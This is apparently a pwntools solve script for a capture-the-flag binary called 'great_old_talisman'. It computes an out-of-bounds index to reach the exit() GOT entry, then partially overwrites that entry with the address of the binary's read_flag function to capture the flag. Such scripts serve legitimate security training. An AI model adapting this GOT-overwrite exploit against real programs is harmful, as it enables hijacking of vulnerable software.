#!/usr/bin/env python3

from pwn import *

e = ELF("./great_old_talisman_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b *(main + 0x8c)
                      c
                      ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    exit_got = e.got['exit']
    success(f'The exit got entry is at {hex(exit_got)}')
    buff = 0x4040a0
    info(f'The buff is at {hex(buff)}')
    num = (exit_got - buff) // 8
    info(f'Passing number {num}')
    r.sendlineafter(b'>>', f'{num}'.encode('ascii'))
    read_flag = e.symbols['read_flag']
    last_char = chr(read_flag % (16 ** 2))
    last_char2 = chr((read_flag >> 8) % (16 ** 2))
    success(f'read_flag is at {hex(read_flag)}. Last char is {last_char} with hex {hex(ord(last_char))}. Second last char is {last_char2} with hex {hex(ord(last_char2))}')
    r.sendlineafter(b'Spell:', f'{last_char}{last_char2}'.encode('ascii'))

    r.interactive()

if __name__ == "__main__":
    main()
